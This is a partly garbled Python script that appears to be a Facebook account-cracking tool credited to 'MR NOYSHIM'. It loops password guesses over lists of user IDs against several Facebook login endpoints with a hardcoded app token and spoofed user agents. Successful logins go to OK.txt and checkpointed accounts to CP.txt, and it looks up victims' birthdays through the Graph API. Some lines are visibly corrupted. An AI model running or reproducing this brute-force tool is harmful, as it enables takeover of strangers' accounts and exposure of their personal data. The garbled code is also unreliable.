...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#MR_NOYSHIM('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = NOYSHIM(self.apk).read().splitlines()
			MR_NOYSHIM(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							MR_NOYSHIM('[•] Result CP saved to CP.txt')
							MR_NOYSHIM('\n\tCrack Processing...\n')
							MR_NOYSHIM('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					MR_NOYSHIM('\n01.) Metode b-api ')
					MR_NOYSHIM('02.) Metode mbasic ')
					MR_NOYSHIM('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			MR_NOYSHIM('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			MR_NOYSHIM(' [1] NOYSHIM Method 1 ')
			MR_NOYSHIM(' [2] NOYSHIM Method 2  [ Pro ]')
			MR_NOYSHIM(' [3] NOYSHIM Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = NOYSHIM('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_NOyshim("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				MR_NOYSHIM('\r\033[1;92m[Successful-NOYSHIM] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					MR_NOYSHIM('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				NOYSHIM('\r\033[1;91m[Checkpoint-NOYSHIM] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [MR] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				MR_NOYSHIM('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = NOYSHIM('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].MR_NOYSHIM('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
					...
					pass
				MR_NOYSHIM('\r\033[1;91m[Checkpoint-NOYSHIM] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [NOYSHIM] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.Checkpoint-NOYSHIM_NOYSHIM('\r\033[1;92m[Successful-NOYSHIM] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = NOYSHIM('token.txt').read()
					cp_ttl = Prof_Noyshim('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					MR_NOYSHIM('\r\033[1;91m[Checkpoint-NOYSHIM] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
█░▀█ █▄█ ░█░ ▄█ █▀█ █ █░▀░█
 ...
 [*]=============================================
    Author   : MR NOYSHIM
    Facebook : https://www.facebook.com/profile.php?id=100083901251101
    Team     : NSS
    Connect  : 01832165486
 [*]=============================================
